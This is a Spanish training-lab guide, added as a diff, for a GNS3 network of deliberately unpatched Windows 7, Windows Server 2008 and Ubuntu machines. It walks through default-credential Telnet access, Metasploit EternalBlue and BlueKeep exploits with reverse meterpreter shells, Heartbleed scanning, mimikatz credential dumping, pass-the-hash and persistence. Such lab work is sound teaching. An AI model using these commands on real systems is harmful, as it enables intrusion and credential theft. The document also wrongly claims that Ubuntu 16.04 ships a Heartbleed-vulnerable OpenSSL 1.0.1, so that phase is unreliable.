@@ -1,0 +1,378 @@
+CASO 5: ACTUALIZACIONES Y PARCHES OLVIDADOS
+"Actualizaciones Olvidadas S.A.S."
+1. DESCRIPCIÓN GENERAL
+"Actualizaciones Olvidadas S.A.S." es una empresa que lleva años sin aplicar parches de seguridad a sus sistemas. Los administradores consideran que "si funciona, no lo toques" y han descuidado por completo la actualización de software y sistemas operativos. Como resultado, todos los equipos tienen vulnerabilidades conocidas y públicas, algunas de ellas con años de antigüedad. Este escenario es más común de lo que parece, especialmente en pequeñas empresas con recursos limitados o en entornos donde los equipos críticos no pueden detenerse para actualizar.
+
+2. OBJETIVO DEL CASO
+Demostrar que:
+
+La falta de actualizaciones convierte cualquier sistema en un blanco fácil, incluso para atacantes novatos que solo ejecutan exploits públicos.
+
+Vulnerabilidades conocidas como EternalBlue (MS17-010) o Heartbleed siguen siendo efectivas en sistemas sin parchear.
+
+Una vez que un atacante compromete un sistema, puede moverse lateralmente aprovechando otras vulnerabilidades en equipos igualmente desactualizados.
+
+La acumulación de deuda técnica en seguridad tiene consecuencias graves y puede llevar a la toma de control total de la red.
+
+3. CONFIGURACIÓN DETALLADA DEL ESCENARIO EN GNS3
+La topología será similar a la del Caso 1 (red plana) pero con sistemas más variados y todos ellos sin parches. Incluiremos un router doméstico sin actualizar como gateway.
+
+text
+[Kali Linux] --- (Internet simulado) --- [Router doméstico (sin actualizar)] --- [Switch] --- [Zona de servidores y PCs]
+                                                                                                |
+                                                                                           [Cliente Windows 7]
+                                                                                                |
+                                                                                           [Ubuntu 16.04]
+                                                                                                |
+                                                                                           [Windows Server 2008]
+Máquinas necesarias:
+Máquina	Sistema	Rol	IP (estática recomendada)	Vulnerabilidades conocidas
+Atacante	Kali Linux	Red Team	192.168.1.100	-
+Router	Router doméstico simulado (Linux con NAT)	Gateway sin actualizar	192.168.1.1	Firmware antiguo, credenciales por defecto, posibles puertos abiertos
+Víctima 1	Windows 7 SP1 (sin parches)	PC de oficina	192.168.1.10	EternalBlue (MS17-010), SMBv1 vulnerable
+Víctima 2	Ubuntu 16.04 LTS (sin actualizar)	Servidor web interno	192.168.1.20	Heartbleed (OpenSSL 1.0.1), Shellshock (si tiene bash vulnerable)
+Víctima 3	Windows Server 2008 R2 (sin parches)	Servidor de archivos	192.168.1.30	EternalBlue, RDP vulnerable (BlueKeep), SMBv1
+Cliente	TinyCore Linux (opcional)	Empleado	192.168.1.200	-
+Detalles de cada máquina:
+a) Kali Linux (atacante):
+
+Herramientas: nmap, Metasploit, searchsploit, openssl (para Heartbleed), hydra, etc.
+
+Conectado a la red interna (o a través del router simulado).
+
+b) Router doméstico simulado:
+
+Podemos usar una máquina Linux mínima (Debian o Ubuntu server) con dos interfaces: una hacia "Internet" (simulada con NAT de GNS3) y otra hacia la red interna.
+
+Configurar NAT con iptables para que los equipos internos tengan salida.
+
+Simular firmware antiguo:
+
+Dejar servicios innecesarios abiertos: Telnet (puerto 23) con credenciales por defecto (admin/admin).
+
+Interfaz web de administración en puerto 80 sin HTTPS y con contraseña débil.
+
+No aplicar parches de seguridad (es decir, no actualizar el sistema base).
+
+Nombre de host: "RouterCasa" o similar.
+
+c) Windows 7 SP1 (sin parches):
+
+Instalar Windows 7 con Service Pack 1, pero no instalar ninguna actualización posterior (ni siquiera las críticas). Lo ideal es una imagen de las primeras versiones de SP1.
+
+Asegurar que SMBv1 esté habilitado (por defecto en versiones antiguas).
+
+Desactivar el firewall de Windows para facilitar (o dejarlo con reglas permisivas).
+
+Compartir una carpeta de pruebas (simula documentos de oficina).
+
+Habilitar RDP (puerto 3389) aunque sea vulnerable.
+
+d) Ubuntu 16.04 LTS (sin actualizar):
+
+Instalar Ubuntu 16.04 desde un ISO antiguo (por ejemplo, la versión original de 2016). No ejecutar apt update ni apt upgrade después de la instalación.
+
+Instalar OpenSSL versión 1.0.1 (la que trae por defecto Ubuntu 16.04 inicial) que es vulnerable a Heartbleed.
+
+Instalar Apache con soporte HTTPS (para exponer Heartbleed). Configurar un sitio web básico con certificado autofirmado.
+
+Asegurar que el servicio SSH esté activo (puerto 22) con versiones de OpenSSH posiblemente vulnerables (aunque no explotaremos eso aquí).
+
+Opcional: instalar bash 4.2 o anterior para probar Shellshock (requiere configuración adicional, como un CGI en Apache).
+
+e) Windows Server 2008 R2 (sin parches):
+
+Instalar Windows Server 2008 R2 (versión sin parches posteriores). Se puede usar una imagen de evaluación antigua.
+
+Habilitar el rol de Servidor de Archivos y compartir una carpeta con datos ficticios.
+
+Asegurar que SMBv1 esté activo (por defecto) y que no se hayan instalado parches de seguridad.
+
+Desactivar firewall o permitir tráfico SMB y RDP.
+
+Opcional: habilitar RDP (puerto 3389) que es vulnerable a BlueKeep en versiones sin parche.
+
+f) TinyCore Linux (cliente):
+
+Solo para simular tráfico adicional. No es esencial para los ataques.
+
+4. PASOS PARA MONTAR EL ESCENARIO EN GNS3
+Paso 1: Crear el proyecto en GNS3.
+
+Nuevo proyecto: "Caso5_SinParches".
+
+Paso 2: Importar las máquinas virtuales a GNS3 desde VirtualBox.
+
+Crear las VMs en VirtualBox con una sola interfaz de red en modo "Red Interna" (nombre: "caso5_intnet").
+
+Asegurarse de que las máquinas Windows tengan suficiente RAM (1 GB para Windows 7, 2 GB para Server 2008). Ubuntu puede funcionar con 512 MB.
+
+Importar cada VM a GNS3.
+
+Paso 3: Arrastrar dispositivos al área de trabajo.
+
+Un switch Ethernet.
+
+El router simulado (Linux con dos interfaces: una para WAN, otra para LAN).
+
+Las 4 máquinas (Kali, Windows 7, Ubuntu, Windows Server).
+
+Conectar:
+
+Interfaz WAN del router a un "NAT" de GNS3 (para simular Internet).
+
+Interfaz LAN del router al switch.
+
+Todas las demás máquinas al switch.
+
+Opcional: añadir TinyCore al switch.
+
+Paso 4: Configurar las IPs.
+
+Router: interfaz LAN con IP 192.168.1.1/24, interfaz WAN con DHCP (o IP fija del NAT de GNS3, ej: 10.0.0.2/24).
+
+Kali: 192.168.1.100/24, puerta de enlace 192.168.1.1.
+
+Windows 7: 192.168.1.10/24, puerta de enlace 192.168.1.1.
+
+Ubuntu: 192.168.1.20/24, puerta de enlace 192.168.1.1.
+
+Windows Server: 192.168.1.30/24, puerta de enlace 192.168.1.1.
+
+TinyCore: 192.168.1.200/24 (si se usa).
+
+Paso 5: Verificar conectividad.
+
+Desde Kali, hacer ping a todas las IPs y al router (192.168.1.1).
+
+Desde Kali, probar acceso a Internet (ej: ping a 8.8.8.8) para asegurar que el NAT del router funciona.
+
+Verificar que los servicios están accesibles:
+
+En Windows 7: probar SMB (con smbclient de Kali o nmap) y RDP.
+
+En Ubuntu: probar HTTPS (puerto 443) con curl o navegador.
+
+En Windows Server: probar SMB y RDP.
+
+Paso 6: Confirmar versiones vulnerables.
+
+En Ubuntu: openssl version debe mostrar 1.0.1 (o similar).
+
+En Windows 7: ejecutar winver y verificar que no hay parques instalados.
+
+En Windows Server: similar.
+
+5. ATAQUE PASO A PASO (DESDE KALI)
+Fase 1: Reconocimiento (Escaneo de red)
+
+Escaneo completo de puertos y detección de versiones:
+
+bash
+nmap -sV -O 192.168.1.0/24
+Resultado esperado:
+
+192.168.1.1 (router): puertos 80 (HTTP), 23 (Telnet), quizá 22 (SSH) si lo configuramos.
+
+192.168.1.10 (Win7): puertos 139, 445 (SMB), 3389 (RDP), 49152-65535 (RPC dinámicos).
+
+192.168.1.20 (Ubuntu): puertos 80 (HTTP), 443 (HTTPS), 22 (SSH).
+
+192.168.1.30 (Win2008): puertos 139, 445, 3389, 80 (si tiene IIS), etc.
+
+192.168.1.200: sin puertos.
+
+Evidencia: Guardar salida.
+
+Fase 2: Explotación del router doméstico
+
+Primero, intentamos acceder al router con credenciales por defecto:
+
+bash
+telnet 192.168.1.1
+Usuario: admin, contraseña: admin (o vacío). Si funciona, tenemos acceso de línea de comandos al router. Esto nos permite modificar reglas de firewall, ver tráfico, etc.
+
+Alternativamente, probar la interfaz web con un navegador: http://192.168.1.1. Si hay panel de login, probar admin/admin.
+
+Impacto: Comprometer el gateway nos da control sobre el tráfico de toda la red. Podríamos redirigir conexiones, espiar, o incluso dejar sin Internet a la empresa.
+
+Evidencia: Captura de pantalla de la sesión Telnet o del panel web.
+
+Fase 3: Explotación de Windows 7 con EternalBlue
+
+Usamos Metasploit para el exploit MS17-010:
+
+bash
+msfconsole
+text
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+Si funciona, obtenemos una sesión Meterpreter en Windows 7. Podemos ejecutar comandos, extraer hashes, etc.
+
+Evidencia: Captura de pantalla de la sesión y de comandos como sysinfo, getuid.
+
+Fase 4: Explotación de Ubuntu con Heartbleed
+
+Heartbleed es una vulnerabilidad en OpenSSL que permite leer memoria del servidor. Podemos usar un script de Metasploit o una herramienta externa como heartbleed-poc.py (que deberíamos tener en Kali). En Metasploit:
+
+text
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS 192.168.1.20
+set RPORT 443
+set VERBOSE true
+run
+Si es vulnerable, el módulo intentará extraer información de la memoria. Podemos repetir varias veces para obtener datos como claves privadas, cookies, etc.
+
+Impacto: Podríamos obtener información sensible del servidor, incluyendo claves SSL que permitirían descifrar tráfico.
+
+Evidencia: Salida del módulo mostrando datos extraídos (aunque sea basura, pero que confirme la vulnerabilidad).
+
+Fase 5: Explotación de Windows Server 2008
+
+Podemos usar el mismo EternalBlue, ya que Server 2008 también es vulnerable. Pero para variar, probemos BlueKeep (CVE-2019-0708) que afecta a RDP en versiones antiguas de Windows. En Metasploit:
+
+text
+search bluekeep
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.1.30
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4445
+exploit
+BlueKeep es más inestable, pero si funciona, también obtenemos una shell.
+
+Alternativa: Si BlueKeep falla, repetir EternalBlue.
+
+Evidencia: Captura de sesión.
+
+Fase 6: Movimiento lateral y consolidación
+
+Ahora que tenemos acceso a varias máquinas, podemos usarlas como pivotes. Por ejemplo, desde la sesión de Windows 7, podemos intentar acceder a archivos compartidos en Windows Server o Ubuntu, o usar mimikatz para extraer credenciales y luego conectarnos a otros equipos.
+
+Desde Meterpreter en Windows 7:
+
+text
+load kiwi
+creds_all
+Si obtenemos hashes, podemos intentar pass-the-hash para conectarnos a Windows Server.
+
+También podemos instalar persistencia (ej: crear usuario, agregar tarea programada) para demostrar que el control es duradero.
+
+6. EVIDENCIAS A CAPTURAR (PARA DOCUMENTACIÓN)
+Escaneo nmap completo mostrando versiones de servicios.
+
+Captura de acceso al router vía Telnet o web con credenciales por defecto.
+
+Captura de sesión Meterpreter en Windows 7 (sysinfo, ipconfig, etc.).
+
+Captura del módulo Heartbleed mostrando que Ubuntu es vulnerable (aunque sea solo la confirmación).
+
+Captura de sesión en Windows Server (BlueKeep o EternalBlue).
+
+Captura de extracción de hashes con mimikatz (opcional, si se logra).
+
+Captura de Wireshark durante algún ataque (para ver tráfico SMB, RDP, etc.) - opcional.
+
+7. LECCIONES APRENDIDAS (PARA EL INFORME)
+La falta de actualizaciones es una de las principales causas de brechas de seguridad.
+
+Vulnerabilidades conocidas y públicas (EternalBlue, Heartbleed, BlueKeep) siguen siendo explotables años después de su descubrimiento.
+
+Un router doméstico sin actualizar puede ser el punto de entrada a toda la red.
+
+La combinación de múltiples sistemas sin parchear permite a un atacante comprometer rápidamente la totalidad de la infraestructura.
+
+Las empresas deben establecer políticas de actualización y parcheo, y realizarlas de forma periódica.
+
+El mantenimiento de inventarios de software y hardware es crucial para saber qué sistemas necesitan atención.
+
+8. RELACIÓN CON EL PROYECTO YAS
+Este caso demuestra la necesidad de:
+
+Formar administradores en la importancia de las actualizaciones y en cómo gestionarlas sin interrumpir el negocio.
+
+Simular entornos heredados (legacy) para practicar la migración y el parcheo seguro.
+
+Entrenar equipos de respuesta a incidentes para actuar cuando se detectan sistemas vulnerables.
+
+Concienciar a la dirección sobre los riesgos de la deuda técnica en seguridad.
+
+YAS proporcionará un laboratorio donde se puedan recrear estos entornos obsoletos y practicar tanto el ataque como la defensa (parcheo, segmentación, monitoreo) sin afectar sistemas reales.
+
+9. RECURSOS NECESARIOS Y POSIBLES PROBLEMAS
+Recursos necesarios:
+Imágenes de máquinas virtuales:
+
+Kali Linux (para atacante).
+
+Windows 7 SP1 (sin parches posteriores).
+
+Ubuntu 16.04 LTS (versión inicial, sin actualizaciones).
+
+Windows Server 2008 R2 (versión sin parches).
+
+TinyCore Linux (opcional, para cliente ligero).
+
+Linux mínimo para router (Debian/Ubuntu server con dos interfaces).
+
+Software:
+
+GNS3 con integración VirtualBox.
+
+En Kali, asegurar que Metasploit esté actualizado (para tener los módulos de EternalBlue, BlueKeep, Heartbleed).
+
+Configuraciones específicas:
+
+En Ubuntu 16.04, instalar OpenSSL 1.0.1 (por defecto) y configurar Apache con HTTPS.
+
+En Windows 7 y Server 2008, desactivar firewall o abrir puertos necesarios.
+
+Posibles problemas y soluciones:
+Las máquinas Windows no tienen las vulnerabilidades activas:
+
+Verificar que SMBv1 esté habilitado: en Windows 7, ir a "Panel de control > Programas > Activar o desactivar características de Windows" y marcar "Soporte para uso compartido de archivos SMB 1.0/CIFS".
+
+En Server 2008, similar.
+
+Para BlueKeep, asegurar que RDP esté habilitado y que no se haya instalado el parche KB4507459 (lo normal si no se actualiza).
+
+Heartbleed no funciona en Ubuntu:
+
+Confirmar que OpenSSL es 1.0.1 (ejecutar openssl version).
+
+Verificar que el servidor HTTPS está funcionando y accesible.
+
+Probar con openssl s_client -connect 192.168.1.20:443 para ver si responde.
+
+Si Apache no tiene SSL, configurarlo: sudo a2enmod ssl, sudo a2ensite default-ssl, y crear certificado autofirmado.
+
+BlueKeep es inestable:
+
+Es conocido que BlueKeep puede causar BSOD en la víctima si no se ejecuta correctamente. Es posible que necesites varios intentos o usar una versión específica del módulo.
+
+Alternativa: usar EternalBlue también en Server 2008, que es más fiable.
+
+Problemas de red:
+
+Asegurar que todas las máquinas tengan la puerta de enlace apuntando al router (192.168.1.1).
+
+Verificar que el router tiene NAT y forwarding activados (iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE y sysctl net.ipv4.ip_forward=1).
+
+Comprobar que el switch en GNS3 no esté causando problemas (usar el switch simple).
+
+Rendimiento:
+
+Windows 7 y Server 2008 consumen bastante RAM. Si el equipo no tiene suficiente, asignar 1 GB a cada uno (mínimo para que funcionen) y cerrar otras VMs.
+
+Considerar usar versiones más ligeras (Windows 7 Embedded, o Windows Server Core) pero requieren más configuración.
+
+Disponibilidad de imágenes:
+
+Las versiones antiguas de Windows pueden no estar disponibles oficialmente. Se pueden buscar en sitios como Internet Archive (para evaluación educativa) o usar versiones de prueba de Microsoft que aún estén disponibles (ej: Windows Server 2008 R2 evaluation).
+
+Ubuntu 16.04 aún se puede descargar de viejas releases.
